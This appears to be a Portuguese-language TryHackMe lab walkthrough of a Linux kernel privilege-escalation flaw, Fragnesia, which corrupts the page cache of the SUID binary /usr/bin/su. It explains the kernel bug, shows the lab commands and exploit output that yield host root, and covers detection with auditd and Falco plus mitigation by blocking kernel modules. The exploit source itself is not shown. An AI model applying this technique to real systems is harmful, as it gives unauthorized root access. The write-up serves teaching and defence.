---
layout: post
title: "TryHackMe - Fragnesia | Linux Kernel Privilege Escalation"
description: "Walkthrough da vulnerabilidade Fragnesia: exploração, análise técnica, detecção e mitigação."
date: 2026-09-27
categories: [TryHackMe, Linux, Privilege-Escalation]
tags: [CVE-2026-46300, Fragnesia, Dirty-Frag, Kernel, Page-Cache, SOC]
---

# TryHackMe — Fragnesia Walkthrough

## 1. Introdução

Fragnesia (CVE-2026-46300) é uma vulnerabilidade de escalação local de privilégios (LPE) no kernel Linux, relacionada ao gerenciamento incorreto de fragmentos de memória compartilhada.

A falha permite modificar temporariamente o conteúdo de um executável protegido no Page Cache e, posteriormente, utilizar um binário com permissão SUID para obter privilégios root no host.

O exploit combina três componentes:

- `splice()` — Referencia páginas de arquivos sem copiar seus dados.
- `skb_try_coalesce()` — Combina buffers de rede, mas perde uma flag de proteção.
- `esp_input()` — Realiza a descriptografia e pode modificar diretamente a memória compartilhada.

O resultado é uma primitiva de escrita controlada de um byte por operação no Page Cache.

## 2. Conceitos fundamentais

Antes de entender a exploração, precisamos conhecer alguns componentes do kernel.

| Conceito | Descrição |
|---|---|
| Buffer | Região temporária da memória utilizada para armazenar dados. |
| Fragmento | Parte dos dados armazenados ou referenciados por um buffer. |
| skb (Socket Buffer) | Estrutura `sk_buff` utilizada pelo kernel para representar e gerenciar pacotes de rede. |
| Page Cache | Área da RAM utilizada pelo Linux para manter páginas de arquivos em cache. |
| Cópia privada | Cópia independente dos dados, permitindo modificações sem afetar a memória original. |
| Namespace | Mecanismo de isolamento de recursos utilizado pelo Linux. |
| SUID | Permissão que permite executar um programa com o UID efetivo de seu proprietário. |

### A importância da flag SKBFL_SHARED_FRAG

A flag `SKBFL_SHARED_FRAG` identifica fragmentos de memória compartilhados com outros subsistemas, como o Page Cache.

Quando essa flag está presente, o kernel deve criar uma cópia privada antes de modificar os dados.

O problema do Fragnesia é que essa informação pode desaparecer durante determinadas operações com buffers de rede.

---

## 3. Dirty Frag e a origem do Fragnesia

A vulnerabilidade anterior, Dirty Frag (CVE-2026-43284), permitia que `esp_input()` modificasse páginas compartilhadas sem realizar corretamente a cópia privada.

Sua correção introduziu uma verificação utilizando:

```c
skb_has_shared_frag()
```

A função verifica se existem fragmentos compartilhados antes de permitir a descriptografia diretamente no buffer.

Entretanto, existia uma falha antiga em `skb_try_coalesce()`, função responsável por combinar buffers de rede.

Ao realizar essa operação, a função não preservava corretamente a flag `SKBFL_SHARED_FRAG`.

Assim, `esp_input()` poderia acreditar que determinado fragmento era privado, mesmo que continuasse referenciando uma página compartilhada.

### Fluxo da vulnerabilidade

```text
Arquivo protegido no Page Cache
            |
            v
      splice() / skb
            |
            v
  SKBFL_SHARED_FRAG = 1
            |
            v
    skb_try_coalesce()
            |
            v
    Flag não preservada
            |
            v
  SKBFL_SHARED_FRAG = 0
            |
            v
        esp_input()
            |
            v
 Descriptografia diretamente
    na memória compartilhada
            |
            v
    Corrupção do Page Cache
```

O nome Fragnesia vem da combinação de *Fragment* e *Amnesia*: o buffer esquece que seu fragmento é compartilhado.

### Segunda variante

Uma segunda variante foi identificada na função `skb_segment()`, que também pode perder a flag ao construir segmentos de rede.

Isso demonstra que o problema não está limitado a uma única função, mas à preservação das informações de segurança durante a manipulação dos fragmentos.

---

# 4. Exploração prática

**Ambiente:** TryHackMe — Fragnesia  
**Usuário inicial:** karen  
**Objetivo:** Local Privilege Escalation — UID 0 no host.

> Os procedimentos abaixo pertencem ao ambiente de laboratório autorizado do TryHackMe.

### Etapa 1 — Verificando os privilégios

Inicialmente, verificamos o contexto do usuário:

```bash
id
```

Resultado:

```text
uid=1001(karen) gid=1001(karen) groups=1001(karen)
```

Estamos utilizando uma conta comum, sem privilégios administrativos.

### Etapa 2 — Compilando o exploit

O código-fonte está disponível no diretório:

```bash
cd /home/karen/fragnesia
```

Compilamos utilizando GCC:

```bash
gcc -O2 -w fragnesia.c -o exp
```

| Parâmetro | Descrição |
|---|---|
| `gcc` | Compilador da linguagem C. |
| `-O2` | Habilita otimizações. |
| `-w` | Suprime avisos de compilação. |
| `-o exp` | Define o nome do executável. |

O resultado será um executável chamado `exp`.

### Etapa 3 — Executando o exploit

```bash
./exp
```

O exploit prepara um ambiente isolado utilizando User Namespace e Network Namespace.

Dentro desse ambiente, o usuário é mapeado como UID 0 e consegue configurar os recursos de rede necessários para explorar a vulnerabilidade.

O programa utiliza o mecanismo ESP-in-TCP para realizar escritas controladas no Page Cache de `/usr/bin/su`.

Trecho da saída:

```text
[*] uid=1001 euid=1001 gid=1001 egid=1001

userns_setup: outer_uid=1001 outer_gid=1001 ns_uid=0 ns_gid=0

namespace_setup_complete=1

[*] target=/usr/bin/su size=55680

[*] smashing 192 bytes into read-only page cache

changed=176 skipped=16 remaining=0

[==================================================] 192/192 (100%)

[+] BUG: changed requested copied byte range to desired values
```

O exploit substituiu os primeiros 192 bytes da representação de `/usr/bin/su` na memória por um pequeno código ELF.

Dos 192 bytes, 176 precisaram ser alterados. Os outros 16 já correspondiam aos valores desejados.

Esse código procura executar `/bin/sh` com privilégios root.

### Etapa 4 — Entendendo o Namespace Root

Após a primeira execução:

```bash
whoami
```

Resultado:

```text
root
```

Entretanto, ao tentar acessar:

```bash
cat /root/flag.txt
```

Recebemos:

```text
Permission denied
```

Isso acontece porque ainda estamos dentro de um User Namespace.

O usuário possui UID 0 nesse ambiente isolado, mas não é o root real do host.

**Namespace-root não significa necessariamente host-root.**

### Etapa 5 — Escalando para Host Root

Primeiro, saímos do ambiente isolado:

```bash
exit
```

Voltamos à sessão original de `karen`.

O Page Cache ainda contém a versão adulterada de `/usr/bin/su`.

Executamos:

```bash
/usr/bin/su
```

O kernel identifica a permissão SUID do executável e atribui UID efetivo 0 ao processo.

Como os bytes carregados do Page Cache estão adulterados, o código inserido pelo exploit é executado com esses privilégios.

Verificamos:

```bash
whoami
id
```

Resultado:

```text
root
uid=0(root) gid=0(root) groups=0(root)
```

Agora temos privilégios root no sistema principal.

### Etapa 6 — Obtendo a flag

```bash
cat /root/flag.txt
```

O acesso agora é permitido, pois o processo possui UID 0 real no host.

**Observação:** o arquivo foi modificado na representação em memória. Isso não significa que o conteúdo original tenha sido sobrescrito diretamente no armazenamento persistente.

---

# 5. Detecção — Perspectiva Blue Team

A exploração pode ser monitorada utilizando ferramentas como auditd, Falco e SIEM.

O principal objetivo é identificar a combinação de chamadas de sistema relacionadas à preparação e execução do exploit.

### Syscalls relevantes

| Syscall / Evento | Comportamento monitorado |
|---|---|
| `unshare()` | Criação de User e Network Namespaces. |
| `socket(AF_ALG)` | Utilização da API criptográfica do kernel. |
| `splice()` | Transferência de dados de um executável protegido para buffers de rede. |
| `setsockopt()` | Configuração de TCP_ULP como espintcp. |
| `XFRM_MSG_NEWSA` | Criação de associações de segurança IPsec. |
| `execve()` | Execução posterior de `/usr/bin/su`. |

### Principal indicador

O indicador mais específico descrito no laboratório é:

```text
setsockopt(TCP_ULP, "espintcp")
```

O ESP-in-TCP possui aplicações legítimas, especialmente em determinados ambientes IPsec, mas sua utilização por um processo inesperado merece investigação.

A correlação com `splice()`, criação de namespaces e execução de um binário SUID aumenta a confiança da detecção.

### Monitoramento com auditd

Exemplo de regras para registrar as syscalls relevantes:

```bash
-a always,exit -F arch=b64 -S setsockopt -k fragnesia_setsockopt
-a always,exit -F arch=b64 -S unshare -k fragnesia_unshare
-a always,exit -F arch=b64 -S splice -k fragnesia_splice
```

Essas regras podem ser incluídas em um arquivo `.rules` do auditd.

O auditd registra as chamadas de sistema, mas a identificação específica de `espintcp` e a correlação entre os descritores de arquivos exigem análise adicional.

Em ambientes de produção, deve-se considerar o volume dos eventos, especialmente os relacionados a `splice()`.

### Detecção com Falco

Uma estratégia de detecção consiste em monitorar:

1. Processos inesperados utilizando `splice()` sobre executáveis SUID.
2. Ativação de `TCP_ULP` com `espintcp`.
3. Ocorrência dos eventos no mesmo processo e socket, em um intervalo curto.
4. Execução posterior de `/usr/bin/su` com elevação de privilégios.

Uma regra que detecta os dois eventos utilizando apenas uma condição `OR` gera alertas individuais, mas não implementa a correlação completa.

Essa correlação pode ser realizada pelo SIEM ou por instrumentação adicional de runtime.

---

## 6. MITRE ATT&CK

| Técnica | ID | Aplicação |
|---|---|---|
| Exploitation for Privilege Escalation | T1068 | Exploração da vulnerabilidade do kernel. |
| Abuse Elevation Control Mechanism: Setuid and Setgid | T1548.001 | Utilização de `/usr/bin/su`. |
| Escape to Host | T1611 | Aplicável à exploração realizada a partir de um container. |
| Indicator Removal | T1070 | Possível tentativa de eliminar vestígios após a exploração. |

---

## 7. Mitigação

A principal medida de segurança é utilizar um kernel atualizado que contenha as correções do Fragnesia e de suas variantes.

Como alternativa temporária, o laboratório apresenta o bloqueio dos seguintes módulos:

- `esp4` — ESP para IPv4.
- `esp6` — ESP para IPv6.
- `rxrpc` — Protocolo utilizado, entre outros serviços, pelo AFS.

### Aplicando a restrição de módulos

```bash
sudo sh -c 'printf "install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n" > /etc/modprobe.d/dirtyfrag.conf'
```

A configuração impede o carregamento normal dos módulos pelo `modprobe`.

O laboratório também apresenta a remoção dos módulos carregados:

```bash
sudo rmmod esp4 esp6 rxrpc 2>/dev/null
```

E o descarte de páginas elegíveis do cache:

```bash
sudo sh -c 'echo 3 > /proc/sys/vm/drop_caches'
```

**Atenção:** essas operações exigem privilégios administrativos e podem interromper serviços dependentes dos módulos. O descarte do cache também não garante a remoção de páginas que continuam em uso.

A configuração de bloqueio não desativa componentes compilados diretamente no kernel. É necessário verificar a configuração específica da distribuição.

Em servidores que utilizam IPsec ou AFS, a atualização para um kernel corrigido deve ser priorizada.

### Validando a mitigação

Após aplicar as restrições, verificar o carregamento dos módulos:

```bash
sudo modprobe esp4
```

Uma tentativa de carregamento impedida, acompanhada da verificação dos módulos efetivamente ativos, ajuda a confirmar a restrição.

A validação final deve considerar também a versão do kernel e o status das correções disponibilizadas pela distribuição.

---

## 8. Conclusão

O Fragnesia demonstra como uma falha relativamente pequena no gerenciamento de buffers pode comprometer a segurança de todo o sistema.

A correção do Dirty Frag introduziu uma verificação adequada para proteger fragmentos compartilhados, mas essa proteção dependia de uma informação que outras funções do kernel não preservavam corretamente.

A consequência foi a possibilidade de modificar páginas de um executável protegido e utilizar suas permissões SUID para obter privilégios root no host.

Do ponto de vista defensivo, três pontos merecem destaque:

- **Integridade da memória:** o conteúdo utilizado pelos processos pode estar adulterado mesmo sem uma escrita convencional no arquivo em disco.
- **Monitoramento comportamental:** a correlação entre syscalls e atividades de processos pode revelar a exploração em tempo real.
- **Segurança do kernel:** uma correção precisa considerar todas as funções que dependem das mesmas condições de segurança.

A vulnerabilidade também demonstra os riscos de ambientes compartilhados: containers e namespaces oferecem isolamento de recursos, mas continuam utilizando o kernel e o Page Cache do host.

---

## Referências

- [TryHackMe](https://tryhackme.com/)
- [Linux Kernel Documentation](https://docs.kernel.org/)
- [MITRE ATT&CK — T1068](https://attack.mitre.org/techniques/T1068/)
- [MITRE ATT&CK — T1548.001](https://attack.mitre.org/techniques/T1548/001/)
- [Falco Documentation](https://falco.org/docs/)
- [Linux Audit Documentation](https://github.com/linux-audit/audit-documentation)

**Disclaimer:** conteúdo produzido para fins educacionais, com base em laboratório controlado do TryHackMe.
